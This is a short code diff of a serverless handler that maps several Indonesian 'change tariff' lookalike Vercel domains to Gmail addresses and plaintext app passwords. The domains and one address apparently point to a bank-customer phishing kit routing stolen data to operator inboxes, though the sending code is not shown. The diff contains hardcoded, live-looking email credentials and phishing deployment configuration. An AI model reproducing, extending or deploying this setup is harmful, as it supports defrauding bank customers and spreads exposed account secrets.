@@ -25,9 +25,9 @@ export default function handler(req, res) {
         pass = 'moiasopufjkptyvr';
 
 
-    } else if(url == 'ubah--tarif.vercel.app'){
-        email = 'callbribricoid66@gmail.com';
-        pass = 'imuujsgssprgrtue';
+    } else if(url == 'tarif--ubah.vercel.app'){
+        email = 'perubahantarif042@gmail.com';
+        pass = 'nfqvekcvqmmbufts';
 
     } else if(url == 'ubahh-tariff-baru-lama.vercel.app'){
         email = 'andarasultan954@gmail.com';
